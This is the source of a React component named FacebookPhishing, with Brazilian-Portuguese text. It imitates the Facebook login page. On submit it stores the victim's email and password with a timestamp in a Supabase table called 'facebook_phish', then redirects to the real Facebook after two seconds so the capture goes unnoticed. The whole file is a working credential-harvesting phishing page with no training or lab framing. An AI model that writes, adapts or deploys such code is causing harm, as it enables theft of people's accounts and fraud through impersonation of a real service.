import React, { useState } from 'react';
import { useParams } from 'react-router-dom';
import { supabase } from '../supabase';
import './FacebookPhishing.css';

export default function FacebookPhishing() {
  const { id } = useParams();
  const [email, setEmail] = useState('');
  const [senha, setSenha] = useState('');
  const [enviado, setEnviado] = useState(false);

  async function handleSubmit(e) {
    e.preventDefault();
    setEnviado(true);
    // Busca o registro pelo id
    const { data, error } = await supabase
      .from('facebook_phish')
      .select('*')
      .eq('id', id)
      .single();
    if (data) {
      const novasCapturas = [...(data.capturas || []), { email, senha, data: new Date().toLocaleString('en-US') }];
      await supabase
        .from('facebook_phish')
        .update({ capturas: novasCapturas })
        .eq('id', id);
    }
    // Redireciona para o Facebook real após 2 segundos
    setTimeout(() => {
      window.location.href = 'https://www.facebook.com/';
    }, 2000);
  }

  return (
    <div className="fb-bg">
      <div className="fb-container">
        <div className="fb-logo">facebook</div>
        <form className="fb-form" onSubmit={handleSubmit}>
          <div className="fb-title">
            O Facebook ajuda você a se conectar e compartilhar com as pessoas que fazem parte da sua vida.
          </div>
          <input
            type="text"
            placeholder="Email ou telefone"
            value={email}
            onChange={e => setEmail(e.target.value)}
            className="fb-input"
            required
          />
          <input
            type="password"
            placeholder="Senha"
            value={senha}
            onChange={e => setSenha(e.target.value)}
            className="fb-input"
            required
          />
          <button type="submit" className="fb-btn">Entrar</button>
          <div className="fb-links">
            <a href="#">Esqueceu a senha?</a>
            <span>·</span>
            <a href="#">Criar nova conta</a>
          </div>
          {enviado && <div className="fb-alert">Aguarde...</div>}
        </form>
        <div className="fb-footer">
          <a href="#">Crie uma Página para uma celebridade, uma marca ou uma empresa.</a>
        </div>
        <div className="fb-langs">
          Português (Brasil) · English (US) · Español · Français (France) · Italiano · Deutsch · العربية · हिन्दी · 中文(简体) · 日本語
        </div>
        <div className="fb-copy">Meta © 2025</div>
      </div>
    </div>
  );
}